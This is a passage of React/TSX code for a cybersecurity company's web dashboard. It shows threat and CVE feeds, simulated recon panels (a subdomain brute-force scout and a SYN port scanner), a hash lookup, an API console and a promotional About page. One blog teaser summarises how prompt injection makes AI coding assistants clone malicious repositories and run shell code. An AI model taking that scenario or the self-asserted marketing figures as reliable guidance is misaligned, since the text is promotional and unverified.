                      <span className="text-red-400 text-[10px]">P1 CRISIS</span>
                    </h3>
                    <div className="text-3xl font-extrabold text-[#ef4444] font-mono tracking-tight">7.4 <span className="text-xs text-slate-500">/ 10</span></div>
                    <p className="text-[11px] text-slate-400 leading-snug">Multiple high-severity CVE releases on authentication mechanisms have been published. Immediate patch enforcement recommended on enterprise gateways.</p>
                  </div>
                  <div className="pt-3 border-t border-slate-900 text-[10px] text-slate-500 font-mono">
                    Updated: {new Date().toLocaleTimeString()} &bull; NVD NIST Feed
                  </div>
                </div>

              </div>

            </div>

            {/* Live Threat Feed and CVE Database Workspace */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              
              {/* Left Side: Real-time Ingestion alerts */}
              <div className="lg:col-span-7 bg-[#0c1117] border border-slate-800 rounded-lg overflow-hidden flex flex-col">
                <div className="px-4 py-3 border-b border-slate-800 bg-slate-900/50 flex justify-between items-center">
                  <h3 className="text-xs font-bold text-slate-300 uppercase tracking-widest font-mono flex items-center gap-1.5">
                    <Terminal className="w-3.5 h-3.5 text-cyan-500" />
                    Sentinel Live Ingestion Feed
                  </h3>
                  <button 
                    onClick={() => fetchThreatFeed()} 
                    disabled={loadingFeed}
                    className="text-cyan-500 hover:text-cyan-400 p-1 rounded hover:bg-slate-800 disabled:opacity-50 transition-colors"
                  >
                    <RefreshCw className={`w-3.5 h-3.5 ${loadingFeed ? 'animate-spin' : ''}`} />
                  </button>
                </div>

                <div className="flex-1 overflow-x-auto">
                  <table className="w-full text-left text-[11px] font-mono whitespace-nowrap">
                    <thead>
                      <tr className="bg-slate-950 text-slate-500 border-b border-slate-800">
                        <th className="p-3 pl-4">ID</th>
                        <th className="p-3">SOURCE IP</th>
                        <th className="p-3">VECTOR TYPE</th>
                        <th className="p-3">RISK LEVEL</th>
                        <th className="p-3 pr-4 text-right">ACTION</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60">
                      {alerts.map((alert) => (
                        <tr 
                          key={alert.id} 
                          className="hover:bg-slate-900/50 cursor-pointer transition-colors"
                          onClick={() => handleSelectAlert(alert)}
                        >
                          <td className="p-3 pl-4 font-bold text-slate-400">{alert.id}</td>
                          <td className="p-3 text-slate-300">{alert.sourceIp}</td>
                          <td className="p-3 text-slate-400 truncate max-w-[180px]">{alert.threatType}</td>
                          <td className="p-3">{getSeverityBadge(alert.severity)}</td>
                          <td className="p-3 pr-4 text-right">
                            <button 
                              className="px-2 py-1 rounded text-[10px] font-bold bg-cyan-950 text-cyan-400 border border-cyan-800/60 hover:bg-cyan-500 hover:text-black hover:border-transparent transition-all"
                              onClick={(e) => {
                                e.stopPropagation();
                                handleSelectAlert(alert);
                              }}
                            >
                              Investigate
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>

              {/* Right Side: CVE Intelligence Database */}
              <div className="lg:col-span-5 bg-[#0c1117] border border-slate-800 rounded-lg p-4 flex flex-col justify-between">
                <div className="space-y-3">
                  <h3 className="text-xs font-bold font-mono text-slate-300 uppercase tracking-widest flex items-center justify-between">
                    <span>CVE Intelligence Alert Database</span>
                    <span className="bg-red-950 text-red-400 border border-red-900 text-[9px] px-1.5 py-0.5 rounded font-normal font-mono">CVSS 9.0+</span>
                  </h3>

                  <div className="space-y-4 max-h-[300px] overflow-y-auto pr-1">
                    {cves.map((cve) => (
                      <div key={cve.id} className="bg-slate-950 p-3 rounded border border-slate-900 space-y-1.5">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-bold text-red-400 font-mono">{cve.id}</span>
                          <span className="text-[10px] text-slate-500 font-mono">{cve.published}</span>
                        </div>
                        <h4 className="text-[11px] text-slate-200 font-bold leading-tight">{cve.title}</h4>
                        <p className="text-[10px] text-slate-500 font-mono">
                          <span className="text-cyan-500">Mitigation:</span> {cve.mitigation}
                        </p>
                      </div>
                    ))}
                  </div>
                </div>

                <div className="pt-3 border-t border-slate-900 text-[10px] text-slate-500 font-mono flex items-center gap-1.5 mt-4">
                  <Info className="w-3.5 h-3.5 text-cyan-500" />
                  <span>Cross-referenced against verified CISA KEV listings</span>
                </div>
              </div>

            </div>

          </div>
        )}

        {/* ================= VIEW 3: AI SECURITY HUB (WORKSPACE) ================= */}
        {currentView === "ai" && (
          <div className="p-4 md:p-6 space-y-6 max-w-7xl mx-auto w-full animate-fade-in">
            
            <div className="space-y-1 border-l-4 border-emerald-500 pl-3">
              <h2 className="text-lg font-bold text-white uppercase tracking-wider">AI Security &amp; Compliance Hub</h2>
              <p className="text-xs text-slate-500">Leverage advanced server-side Gemini intelligence models to run static scans, compliance checks, and threat audit calculations.</p>
            </div>

            {/* AI Workspace layout splits */}
            <div className="bg-[#0c1117] border border-slate-800 rounded-lg flex flex-col overflow-hidden min-h-[480px]">
              
              {/* Sub tabs selector */}
              <div className="border-b border-slate-800 bg-slate-950 p-1.5 flex overflow-x-auto gap-1">
                {[
                  { id: "log", title: "Log File Audit", icon: Terminal },
                  { id: "code", title: "SAST Code Scanner", icon: Code },
                  { id: "domain", title: "Threat Intel Checker", icon: Globe },
                  { id: "compliance", title: "DPDP & SOC2 Auditor", icon: FileCheck },
                  { id: "chat", title: "Architect Consultation", icon: Shield }
                ].map((tab) => (
                  <button
                    key={tab.id}
                    onClick={() => setActiveAiTab(tab.id as any)}
                    className={`px-3 py-1.5 rounded text-xs font-mono font-bold flex items-center gap-1.5 shrink-0 transition-all ${
                      activeAiTab === tab.id ? "bg-cyan-950 text-cyan-400 border border-cyan-800/80" : "text-slate-500 hover:text-slate-300 hover:bg-slate-900/50"
                    }`}
                  >
                    <tab.icon className="w-3.5 h-3.5" /> {tab.title}
                  </button>
                ))}
              </div>

              {/* Input-Output Form panel */}
              <form onSubmit={handleAnalyze} className="flex-1 flex flex-col p-4 md:p-6 gap-6">
                <div className="flex-1 grid grid-cols-1 lg:grid-cols-2 gap-6">
                  
                  {/* Left block - input form */}
                  <div className="flex flex-col gap-3">
                    <div className="flex items-center justify-between">
                      <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest">Target Payload Input</span>
                      <button 
                        type="button" 
                        onClick={() => applyPresetTemplate(activeAiTab)}
                        className="text-[9px] font-mono text-slate-400 hover:text-cyan-400 border border-slate-800 px-2 py-0.5 rounded bg-slate-950"
                      >
                        Reset Template
                      </button>
                    </div>

                    <textarea
                      className="flex-1 w-full bg-slate-950 border border-slate-800 rounded p-4 text-xs font-mono text-slate-200 placeholder-slate-700 focus:outline-none focus:border-cyan-500/60 resize-none min-h-[220px]"
                      value={analyzerInput}
                      onChange={(e) => setAnalyzerInput(e.target.value)}
                      placeholder="Paste targets or codes here..."
                    />

                    <button
                      type="submit"
                      disabled={analyzerLoading || !analyzerInput.trim()}
                      className="w-full bg-cyan-500 hover:bg-cyan-400 text-black py-3 px-4 rounded font-bold text-xs uppercase tracking-wider flex items-center justify-center gap-2 disabled:opacity-50 transition-all cursor-pointer font-sans shadow-md"
                    >
                      {analyzerLoading ? (
                        <>
                          <RefreshCw className="w-4 h-4 animate-spin" />
                          Analyzing targets on Active server models...
                        </>
                      ) : (
                        <>
                          <Zap className="w-4 h-4 fill-black" />
                          Execute Real AI Security Audit
                        </>
                      )}
                    </button>
                  </div>

                  {/* Right block - output response */}
                  <div className="flex flex-col gap-3 bg-slate-950 rounded border border-slate-800 p-4">
                    <div className="flex items-center justify-between border-b border-slate-900 pb-2">
                      <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest flex items-center gap-1.5">
                        <Terminal className="w-3.5 h-3.5 text-cyan-500" />
                        AI Shield Report Terminal
                      </span>
                      {analyzerLoading && (
                        <span className="text-[9px] font-mono text-cyan-400 animate-pulse uppercase">
                          INGESTING STREAM...
                        </span>
                      )}
                    </div>

                    <div className="flex-1 overflow-y-auto text-xs leading-relaxed space-y-4 font-mono text-slate-300 select-text max-h-[360px]">
                      {analyzerReport ? (
                        <div className="prose prose-invert prose-xs whitespace-pre-wrap">
                          {analyzerReport}
                        </div>
                      ) : (
                        <div className="h-full flex flex-col items-center justify-center text-center text-slate-600 p-6 space-y-2">
                          <Shield className="w-10 h-10 text-slate-800" />
                          <p className="text-xs font-semibold text-slate-500 uppercase tracking-wider">No Active Audit Compiled</p>
                          <p className="text-[11px] text-slate-600 max-w-xs">Write or edit your input in the left console and click execute to receive verified neural insights.</p>
                        </div>
                      )}
                    </div>
                  </div>

                </div>
              </form>

            </div>

          </div>
        )}

        {/* ================= VIEW 4: THREATCORE SECURITY TOOLS ================= */}
        {currentView === "tools" && (
          <div className="p-4 md:p-6 space-y-6 max-w-7xl mx-auto w-full animate-fade-in">
            
            <div className="space-y-1 border-l-4 border-purple-500 pl-3">
              <h2 className="text-lg font-bold text-white uppercase tracking-wider">ThreatCore™ Security Tools Portal</h2>
              <p className="text-xs text-slate-500">Access, run, and query 100+ simulated production security tools directly in your workspace sandbox.</p>
            </div>

            {/* Three key interactive security scanners */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              
              {/* Tool 1: Subdomain Certificate Scout */}
              <div className="lg:col-span-6 bg-[#0c1117] border border-slate-800 rounded-lg p-4 flex flex-col justify-between space-y-4">
                <div className="space-y-1">
                  <h3 className="text-xs font-bold font-mono text-slate-300 uppercase tracking-widest flex items-center gap-1.5">
                    <Globe className="w-4 h-4 text-cyan-500" />
                    Subdomain CT Recon Scout
                  </h3>
                  <p className="text-[10px] text-slate-500">Brute-force DNS prefix mapping &amp; query Certificate Transparency logs.</p>
                </div>

                <div className="space-y-3">
                  <div className="flex gap-2">
                    <input 
                      type="text" 
                      value={toolSubdomainInput}
                      onChange={(e) => setToolSubdomainInput(e.target.value)}
                      className="flex-1 bg-slate-950 border border-slate-800 rounded px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-cyan-500"
                      placeholder="e.g. cyberdudebivash.com"
                    />
                    <button
                      onClick={runSubdomainScout}
                      disabled={scoutingActive}
                      className="bg-cyan-500 hover:bg-cyan-400 text-black px-4 py-1.5 rounded text-xs font-extrabold uppercase transition-all disabled:opacity-50"
                    >
                      Scout
                    </button>
                  </div>

                  {/* Scout Output Console */}
                  <div className="bg-slate-950 border border-slate-900 rounded p-3 h-48 overflow-y-auto font-mono text-[10px] text-slate-400 space-y-1">
                    {scoutLogs.length === 0 ? (
                      <span className="text-slate-600 block italic">Awaiting target domain input. Click scout to resolve routes.</span>
                    ) : (
                      scoutLogs.map((log, idx) => (
                        <div key={idx} className="truncate">{log}</div>
                      ))
                    )}

                    {scoutResults.length > 0 && (
                      <div className="pt-2 mt-2 border-t border-slate-900 space-y-1 text-emerald-400">
                        <div className="font-bold">[RESOLVED SUBDOMAINS]</div>
                        {scoutResults.map((res, idx) => (
                          <div key={idx} className="flex justify-between gap-2">
                            <span>{res.subdomain}</span>
                            <span className="text-slate-500">[{res.ip}] Status {res.status}</span>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              </div>

              {/* Tool 2: SYN Port Scanner */}
              <div className="lg:col-span-6 bg-[#0c1117] border border-slate-800 rounded-lg p-4 flex flex-col justify-between space-y-4">
                <div className="space-y-1">
                  <h3 className="text-xs font-bold font-mono text-slate-300 uppercase tracking-widest flex items-center gap-1.5">
                    <Terminal className="w-4 h-4 text-purple-400" />
                    SYN Port Scanner Probe
                  </h3>
                  <p className="text-[10px] text-slate-500">Map and probe open industrial ports against target IP host.</p>
                </div>

                <div className="space-y-3">
                  <div className="flex gap-2">
                    <input 
                      type="text" 
                      value={toolPortInput}
                      onChange={(e) => setToolPortInput(e.target.value)}
                      className="flex-1 bg-slate-950 border border-slate-800 rounded px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-cyan-500"
                      placeholder="e.g. 103.142.12.98"
                    />
                    <button
                      onClick={runPortScan}
                      disabled={portScanningActive}
                      className="bg-cyan-500 hover:bg-cyan-400 text-black px-4 py-1.5 rounded text-xs font-extrabold uppercase transition-all disabled:opacity-50"
                    >
                      Scan Port
                    </button>
                  </div>

                  {/* Port Output Console */}
                  <div className="bg-slate-950 border border-slate-900 rounded p-3 h-48 overflow-y-auto font-mono text-[10px] text-slate-400 space-y-1">
                    {portScanLogs.length === 0 ? (
                      <span className="text-slate-600 block italic">Awaiting IP address input. Click scan to map targets.</span>
                    ) : (
                      portScanLogs.map((log, idx) => (
                        <div key={idx} className="truncate">{log}</div>
                      ))
                    )}

                    {portScanResults.length > 0 && (
                      <div className="pt-2 mt-2 border-t border-slate-900 space-y-1 text-cyan-400">
                        <div className="font-bold">[PROBED PORT STATUS]</div>
                        {portScanResults.map((res, idx) => (
                          <div key={idx} className="flex justify-between gap-2">
                            <span>PORT {res.port} &bull; {res.service}</span>
                            <span className="text-slate-500">[{res.state}]</span>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              </div>

            </div>

            {/* Tool 3: Malware Hash Reputation lookup */}
            <div className="bg-[#0c1117] border border-slate-800 rounded-lg p-6 space-y-4">
              <div className="space-y-1">
                <h3 className="text-xs font-bold font-mono text-slate-300 uppercase tracking-widest flex items-center gap-1.5">
                  <Shield className="w-4 h-4 text-emerald-500" />
                  Malware File Hash Reputation Tracker
                </h3>
                <p className="text-[10px] text-slate-500">Query SHA-256 signatures to check reputation indexes against Cozy Bear, LockBit, or standard dropper databases.</p>
              </div>

              <div className="space-y-4">
                <div className="flex flex-col sm:flex-row gap-3">
                  <input 
                    type="text" 
                    value={hashInput}
                    onChange={(e) => setHashInput(e.target.value)}
                    className="flex-1 bg-slate-950 border border-slate-800 rounded px-4 py-2 text-xs font-mono focus:outline-none focus:border-cyan-500"
                    placeholder="Enter SHA-256 target hash"
                  />
                  <div className="flex gap-2">
                    <button
                      onClick={runHashCheck}
                      className="bg-cyan-500 hover:bg-cyan-400 text-black px-6 py-2 rounded text-xs font-extrabold uppercase transition-all shrink-0 cursor-pointer"
                    >
                      Check Signature
                    </button>
                    <button
                      onClick={() => setHashInput("6a4f12de9b3c4f71a9ee08310c111bbfe9922e334a179bf88aa25e3b0c4083a2")}
                      className="bg-slate-900 hover:bg-slate-800 text-slate-400 border border-slate-800 px-3 py-2 rounded text-xs font-mono shrink-0"
                    >
                      Try Bad Hash
                    </button>
                  </div>
                </div>

                {hashReport && (
                  <div className="bg-slate-950 border border-slate-900 rounded p-4 font-mono text-xs text-slate-300 whitespace-pre-wrap leading-relaxed">
                    {hashReport}
                  </div>
                )}
              </div>
            </div>

          </div>
        )}

        {/* ================= VIEW 5: RESEARCH BLOG & ACADEMY ================= */}
        {currentView === "blog" && (
          <div className="p-4 md:p-6 space-y-6 max-w-7xl mx-auto w-full animate-fade-in">
            
            <div className="space-y-1 border-l-4 border-amber-500 pl-3">
              <h2 className="text-lg font-bold text-white uppercase tracking-wider">Cybersecurity Research Blog &amp; Academy</h2>
              <p className="text-xs text-slate-500">Explore technical advisories, zero-day CVE teardowns, and course modules delivered directly from our training coordinators.</p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              
              {/* Blog posts list */}
              <div className="lg:col-span-8 space-y-4">
                <h3 className="text-xs font-bold font-mono text-slate-400 uppercase tracking-widest">Recent Threat Advisories</h3>
                
                {[
                  {
                    title: "Deep-Dive Teardown of DirtyClone (CVE-2026-43503) Linux Privilege Escalation",
                    desc: "An exhaustive static and behavioral walkthrough of the DirtyClone memory corruption flaw allowing unprivileged users to silently rewrite executable code segments directly in kernel buffers.",
                    meta: "Published: June 26, 2026 &bull; Author: Bivash Kumar Nayak &bull; Category: Kernel exploits"
                  },
                  {
                    title: "MFA Bypass via Adversary-in-the-Middle (AiTM) Phishing Kits: Bluekit Operational Report",
                    desc: "Our threat intelligence scouts have tracked nearly 70 active hostnames distributing browser-in-the-middle proxy configurations. Analysis of OIDC token stealing patterns and direct countermeasures.",
                    meta: "Published: June 24, 2026 &bull; Author: Sentinel APEX Team &bull; Category: Phishing analysis"
                  },
                  {
                    title: "OWASP Top 10 Mapping for Large Language Models: Prompt Injection Vectors Explored",
                    desc: "How prompt injections bypass sanitization logic to trick AI coding assistants into clining malicious subrepositories and executing local OS shell codes.",
                    meta: "Published: June 20, 2026 &bull; Author: CyberDude Research Lab &bull; Category: LLM Security"
                  }
                ].map((post, idx) => (
                  <div key={idx} className="bg-[#0c1117] border border-slate-800 p-5 rounded-lg space-y-2 hover:border-slate-700 transition-all">
                    <h4 className="text-sm font-extrabold text-slate-100 hover:text-cyan-400 transition-colors cursor-pointer">{post.title}</h4>
                    <p className="text-xs text-slate-400 leading-relaxed font-sans">{post.desc}</p>
                    <div className="pt-2 flex justify-between items-center text-[10px] font-mono text-slate-500">
                      <span dangerouslySetInnerHTML={{ __html: post.meta }}></span>
                      <span className="text-cyan-500 hover:underline cursor-pointer">Read Full Intel →</span>
                    </div>
                  </div>
                ))}
              </div>

              {/* Course Academy pre-views */}
              <div className="lg:col-span-4 space-y-4">
                <h3 className="text-xs font-bold font-mono text-slate-400 uppercase tracking-widest">Ecosystem Academy Courses</h3>

                <div className="space-y-4">
                  {[
                    { title: "SOC Analyst Runbook (Tier 1-3)", cost: "₹499", level: "Intermediate", desc: "Build incident response playbooks, learn SPL/KQL alerts, and run network forensics." },
                    { title: "AI Red Teaming & LLM Security", cost: "₹999", level: "Advanced", desc: "Hardening LLM data flows, writing secure API code, testing prompt injections." },
                    { title: "Active OSINT & Threat Hunting", cost: "₹699", level: "Beginner-Intermediate", desc: "Querying CT logs, WHOIS metadata, certificate mappings, and hash reputations." }
                  ].map((course, idx) => (
                    <div key={idx} className="bg-[#0c1117] border border-slate-800 p-4 rounded-lg space-y-2.5">
                      <div className="flex justify-between items-start">
                        <span className="text-xs font-extrabold text-slate-200 leading-tight">{course.title}</span>
                        <span className="text-[10px] font-mono text-emerald-400 bg-emerald-950 px-1 py-0.5 rounded border border-emerald-900">{course.cost}</span>
                      </div>
                      <p className="text-[11px] text-slate-500 leading-snug font-sans">{course.desc}</p>
                      <div className="flex justify-between items-center text-[10px] font-mono">
                        <span className="text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded border border-cyan-900/60">Level: {course.level}</span>
                        <button className="text-slate-300 hover:text-cyan-400 font-bold flex items-center gap-1">
                          <Play className="w-3 h-3 fill-slate-300 hover:fill-cyan-400" /> Start Course
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

            </div>

          </div>
        )}

        {/* ================= VIEW 6: PROGRAMMABLE API WORKSPACE ================= */}
        {currentView === "api" && (
          <div className="p-4 md:p-6 space-y-6 max-w-7xl mx-auto w-full animate-fade-in">
            
            <div className="space-y-1 border-l-4 border-red-500 pl-3">
              <h2 className="text-lg font-bold text-white uppercase tracking-wider">Monetization Core™ Rest API Portal</h2>
              <p className="text-xs text-slate-500">Programmatically ingest global threat matrices directly into your local Splunk, Microsoft Sentinel, or IBM QRadar SIEM stack.</p>
            </div>

            {/* Interactive API Key manager & test console */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              
              {/* Left sidebar: 8 Ecosystem REST Endpoints list */}
              <div className="lg:col-span-5 space-y-4">
                <div className="bg-[#0c1117] border border-slate-800 p-4 rounded-lg space-y-3">
                  <div className="flex items-center justify-between border-b border-slate-900 pb-2">
                    <h3 className="text-xs font-bold font-mono text-slate-300 uppercase tracking-widest">Ecosystem Route Registry</h3>
                    <span className="text-[9px] font-mono text-cyan-400 bg-cyan-950/80 px-1.5 py-0.5 rounded border border-cyan-900/30">8 endpoints</span>
                  </div>
                  
                  <div className="space-y-2 max-h-[350px] overflow-y-auto pr-1">
                    {ECOSYSTEM_APIS.map((api, idx) => {
                      const isSelected = activeEcosystemApiIndex === idx;
                      return (
                        <button
                          key={idx}
                          onClick={() => executeEcosystemApiRequest(idx)}
                          className={`w-full text-left p-2.5 rounded border transition-all flex flex-col space-y-1.5 cursor-pointer ${
                            isSelected 
                              ? "bg-cyan-950/50 border-cyan-500/50 text-slate-200" 
                              : "bg-slate-950/55 border-slate-900 text-slate-400 hover:border-slate-800 hover:bg-slate-900/40"
                          }`}
                        >
                          <div className="flex items-center justify-between">
                            <span className="text-[10px] font-mono text-cyan-400 font-bold tracking-tight truncate max-w-[200px]">{api.url}</span>
                            <span className="text-[8px] font-mono text-slate-500 uppercase tracking-wider">{api.responseType}</span>
                          </div>
                          <div className="space-y-0.5">
                            <h5 className="text-[10px] font-bold text-slate-300 uppercase tracking-wide">{api.path}</h5>
                            <p className="text-[9px] text-slate-500 leading-snug line-clamp-1">{api.description}</p>
                          </div>
                        </button>
                      );
                    })}
                  </div>
                </div>

                {/* API Credentials card */}
                <div className="bg-[#0c1117] border border-slate-800 p-4 rounded-lg space-y-4">
                  <div className="space-y-2">
                    <label className="block text-[9px] font-mono text-slate-500 uppercase tracking-widest">Active API Client Token</label>
                    <div className="flex gap-2">
                      <input 
                        type="text" 
                        readOnly 
                        value={apiKey}
                        className="flex-1 bg-slate-950 border border-slate-800 rounded px-2.5 py-1.5 text-xs font-mono text-slate-400 focus:outline-none"
                      />
                      <button 
                        onClick={() => setApiKey("cdb_live_key_" + Math.floor(Math.random() * 9000000 + 1000000))}
                        className="bg-slate-900 hover:bg-slate-800 text-slate-400 border border-slate-800 px-2.5 py-1.5 rounded text-xs font-mono cursor-pointer"
                      >
                        Rotate
                      </button>
                    </div>
                  </div>

                  <div className="space-y-2 font-mono text-[10px] text-slate-450">
                    <div className="flex justify-between border-b border-slate-900 pb-1">
                      <span>Access Tier</span>
                      <span className="text-emerald-400 font-bold">PRO SUBNET INTEGRITY</span>
                    </div>
                    <div className="flex justify-between border-b border-slate-900 pb-1">
                      <span>Rate Limit</span>
                      <span>1,000 req / min</span>
                    </div>
                    <div className="flex justify-between">
                      <span>Node Location</span>
                      <span className="text-cyan-500">Jajpur, Odisha Hub</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Live console playground code response block */}
              <div className="lg:col-span-7 bg-[#0c1117] border border-slate-800 rounded-lg p-5 flex flex-col overflow-hidden">
                <div className="flex items-center justify-between border-b border-slate-900 pb-2 mb-3">
                  <span className="text-xs font-bold font-mono text-slate-300 uppercase tracking-widest">SIEM / Client shell query</span>
                  <div className="flex items-center gap-1.5 text-[9px] font-mono text-emerald-400">
                    <span className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></span>
                    HTTPS SECURE GCM-256
                  </div>
                </div>

                <div className="bg-slate-950 border border-slate-900 rounded p-3.5 font-mono text-[10px] text-slate-400 select-text mb-4 leading-relaxed">
                  {`curl -X GET \\
  "https://intel.cyberdudebivash.com${ECOSYSTEM_APIS[activeEcosystemApiIndex]?.url || "/api"}" \\
  -H "Authorization: Bearer ${apiKey}" \\
  -H "Content-Type: application/json"`}
                </div>

                <div className="flex items-center justify-between mb-2">
                  <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest">Response Output Console</span>
                  <button 
                    onClick={() => executeEcosystemApiRequest(activeEcosystemApiIndex)}
                    className="bg-cyan-500 hover:bg-cyan-400 text-black px-3 py-1 rounded text-[10px] font-extrabold uppercase tracking-wider transition-all cursor-pointer flex items-center gap-1"
                  >
                    <Send className="w-3 h-3" /> Execute Request
                  </button>
                </div>
                
                <div className="flex-1 bg-slate-950 border border-slate-900 rounded p-4 font-mono text-[11px] text-emerald-400 select-text overflow-y-auto max-h-[380px] whitespace-pre-wrap leading-relaxed">
                  {apiConsoleResponse}
                </div>
              </div>

            </div>

          </div>
        )}

      </div>

      {/* ===== COMPLIANCE PAGES ===== */}
      {(currentView === "about" || currentView === "privacy" || currentView === "terms" || currentView === "copyright") && (
        <div className="min-h-screen bg-[#030912] border-t border-slate-800/60">
          {/* Page hero accent */}
          <div className="h-0.5 w-full bg-gradient-to-r from-transparent via-cyan-500/70 to-transparent" />

          <div className="max-w-5xl mx-auto px-6 py-12">
            <button onClick={() => setCurrentView("home")} className="mb-10 text-xs text-slate-500 hover:text-cyan-400 transition-colors flex items-center gap-2 font-mono group">
              <span className="group-hover:-translate-x-1 transition-transform inline-block">←</span> Back to Gateway
            </button>

            {/* ===== ABOUT US ===== */}
            {currentView === "about" && (
              <div className="space-y-10">
                {/* Hero */}
                <div className="relative">
                  <div className="text-[10px] font-mono text-cyan-500 uppercase tracking-widest mb-3 flex items-center gap-2">
                    <span className="w-1.5 h-1.5 rounded-full bg-cyan-500 animate-pulse" />
                    Corporate Profile · Est. 2020
                  </div>
                  <h1 className="text-3xl md:text-4xl font-extrabold text-white mb-4 leading-tight">
                    About CyberDudeBivash<span className="text-cyan-400">®</span>
                  </h1>
                  <p className="text-slate-300 leading-relaxed text-sm md:text-base max-w-3xl font-sans">
                    CYBERDUDEBIVASH PRIVATE LIMITED is India's autonomous AI-powered cybersecurity authority — delivering real-time threat intelligence, managed SOC operations, AI security auditing, and 100+ production-grade security tools to enterprise teams, government agencies, and security researchers globally. Founded in Odisha in 2020, we stand at the intersection of AI innovation and enterprise-grade cyber defense.
                  </p>
                </div>

                {/* Stats */}
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  {[
                    { value: "500K+", label: "Threat IOCs Tracked", color: "text-cyan-400" },
                    { value: "50+", label: "Countries Protected", color: "text-emerald-400" },
                    { value: "100+", label: "AI Security Tools", color: "text-violet-400" },
                    { value: "99.9%", label: "Platform SLA Uptime", color: "text-amber-400" },
                  ].map(s => (
                    <div key={s.label} className="bg-slate-900/60 border border-slate-800 rounded-xl p-4 text-center">
                      <div className={`text-2xl font-extrabold font-mono ${s.color}`}>{s.value}</div>
                      <div className="text-[10px] text-slate-500 uppercase tracking-widest mt-1">{s.label}</div>
                    </div>
                  ))}
                </div>

                {/* Mission / Vision / Values */}
                <div className="grid md:grid-cols-3 gap-5">
                  {[
                    {
                      title: "Mission",
                      color: "border-cyan-500/40 bg-cyan-950/10",
                      label: "text-cyan-400",
                      body: "To democratize enterprise-grade cybersecurity with AI-native tools, real-time threat intelligence, and autonomous SOC operations — protecting organizations of every scale, from Indian SMEs to global Fortune 500 enterprises.",
                    },
                    {
                      title: "Vision",
                      color: "border-violet-500/40 bg-violet-950/10",
                      label: "text-violet-400",
                      body: "To be India's premier global cybersecurity authority, setting the international standard for AI-driven threat defense in the Asia-Pacific region and establishing CYBERDUDEBIVASH as the most trusted name in autonomous cyber intelligence.",
                    },
                    {
                      title: "Core Values",
                      color: "border-emerald-500/40 bg-emerald-950/10",
                      label: "text-emerald-400",
                      body: "Integrity in intelligence reporting. Zero-tolerance for false positives. Radical transparency in compliance. Responsible disclosure. India-first data sovereignty. Open-source contribution to the global security community.",
                    },
                  ].map(c => (
                    <div key={c.title} className={`border rounded-xl p-5 ${c.color}`}>
                      <h3 className={`text-xs font-bold uppercase tracking-widest mb-2 ${c.label}`}>{c.title}</h3>
                      <p className="text-xs text-slate-400 leading-relaxed font-sans">{c.body}</p>
                    </div>
                  ))}
                </div>

                {/* Founder */}
                <div className="bg-gradient-to-r from-slate-900/80 to-slate-900/40 border border-slate-800 rounded-xl p-6 flex flex-col md:flex-row gap-6">
                  <div className="flex-shrink-0 w-16 h-16 rounded-xl bg-gradient-to-br from-cyan-500 to-cyan-800 flex items-center justify-center text-white font-black text-2xl shadow-lg shadow-cyan-900/40">
                    B
                  </div>
                  <div className="flex-1 space-y-2">
                    <div className="text-[10px] font-mono text-slate-500 uppercase tracking-widest">Founder & CEO</div>
                    <h3 className="text-lg font-bold text-white">Bivasha Kumar Nayak</h3>
                    <p className="text-xs text-slate-400 leading-relaxed font-sans">
                      Cybersecurity Engineer, Threat Intelligence Specialist, and OWASP contributor based in Jajpur Road, Odisha, India. Bivasha founded CYBERDUDEBIVASH in 2020 with a singular mission: to bring autonomous AI-powered cyber defense to Indian enterprises at scale. With expertise spanning penetration testing, SIGMA rule engineering, incident response, and AI security auditing, he leads a platform trusted by security teams across 50+ nations.
                    </p>
                    <div className="flex flex-wrap gap-2 pt-1">
                      {["OWASP Contributor", "MITRE ATT&CK Expert", "India DPDP Specialist", "AI Red Team Lead", "ISO 27001 Practitioner"].map(tag => (
                        <span key={tag} className="text-[10px] font-mono text-cyan-400 bg-cyan-950/40 border border-cyan-900/40 px-2 py-0.5 rounded">{tag}</span>
                      ))}
                    </div>
                  </div>
                </div>

                {/* Services we deliver */}
                <div className="space-y-4">
                  <h2 className="text-sm font-bold text-white uppercase tracking-widest border-b border-slate-800 pb-3">What We Deliver</h2>
                  <div className="grid md:grid-cols-2 gap-4">
                    {[
                      { title: "Managed SOC-as-a-Service", desc: "24×7 autonomous security operations center monitoring your infrastructure with AI-driven alert triage, threat hunting, and incident response playbooks." },
                      { title: "Sentinel APEX™ Threat Intelligence", desc: "Real-time IOC feeds, CVE tracking, SIGMA detection rules, and geo-tagged attack maps covering 500K+ active threat indicators globally." },
                      { title: "AI Security Audit Platform", desc: "Automated vulnerability scanning, OWASP LLM Top 10 assessments, code security reviews, and compliance gap analysis against NIST, ISO 27001, and DPDP Act." },
                      { title: "ThreatCore™ Security Toolkits", desc: "100+ production-grade security tools for penetration testing, digital forensics, OSINT, network analysis, and malware reverse engineering." },
                      { title: "India DPDP Act Compliance", desc: "End-to-end data protection compliance scanning, privacy impact assessments, DPO advisory, and breach notification readiness for Indian enterprises." },
                      { title: "Enterprise REST API", desc: "Programmable threat intelligence API delivering IOC enrichment, malware hash lookups, CVE data, and geolocation threat data to your SIEM/SOAR in real time." },
                    ].map(s => (
                      <div key={s.title} className="bg-slate-900/40 border border-slate-800 rounded-lg p-4 flex gap-3">
                        <span className="w-1.5 h-1.5 rounded-full bg-cyan-400 mt-1.5 shrink-0" />
                        <div>
                          <h4 className="text-xs font-bold text-slate-200 mb-1">{s.title}</h4>
                          <p className="text-[11px] text-slate-500 leading-relaxed font-sans">{s.desc}</p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

